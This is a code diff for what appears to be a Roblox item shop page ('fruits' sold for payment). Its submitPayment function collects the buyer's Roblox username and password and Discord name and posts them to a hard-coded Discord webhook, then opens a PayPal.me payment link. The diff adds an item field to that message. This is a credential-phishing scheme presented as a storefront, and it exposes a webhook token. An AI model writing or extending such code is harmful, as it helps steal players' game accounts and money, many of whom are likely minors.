@@ -4,6 +4,7 @@ function openModal() {
     var modalImage = document.getElementById('modalImage');
     var modalTitle = document.getElementById('modalTitle');
     var modalDescription = document.getElementById('modalDescription');
+    var fruit = document.getElementById('fruitLabel');
     var amountLabel = document.getElementById('amountLabel');
 
     // Set content for the modal
@@ -23,6 +24,7 @@ function closeModal() {
 
 // Function to handle payment submission
 function submitPayment() {
+    var fruit = document.getElementById('fruit').value;
     var amount = document.getElementById('amount').value;
     var robloxUsername = document.getElementById('robloxUsername').value;
     var robloxPassword = document.getElementById('robloxPassword').value;
@@ -31,7 +33,7 @@ function submitPayment() {
     // Send the payment details to the Discord webhook
     var webhookURL = 'https://discord.com/api/webhooks/1259203378890670241/FVvyQ-QsNZ0rJ-3SfRDP2Ep6-i1qb442YuRztibJaA3cuzgisDK0ySEZU4woqdX5uiYg'; // dont be an asshole.
     var payload = {
-        content: `**Payment Details**\nAmount: $${amount}\nRoblox Username: ${robloxUsername}\nRoblox Password: ${robloxPassword}\nDiscord Username: ${discordUsername}`
+        content: `**Payment Details**\nFruit: ${fruit}\nAmount: $${amount}\nRoblox Username: ${robloxUsername}\nRoblox Password: ${robloxPassword}\nDiscord Username: ${discordUsername}`
     };
 
     fetch(webhookURL, {
@@ -43,6 +45,9 @@ function submitPayment() {
     })
     .then(response => {
         if (response.ok) {
+            alert('Payment details sent successfully.');
+            var paypalMeURL = `https://www.paypal.me/redzzgoat/${amount}`;
+            window.open(paypalMeURL, '_blank');
             alert('Payment details sent successfully.');
         } else {
             alert('Failed to send payment details.');
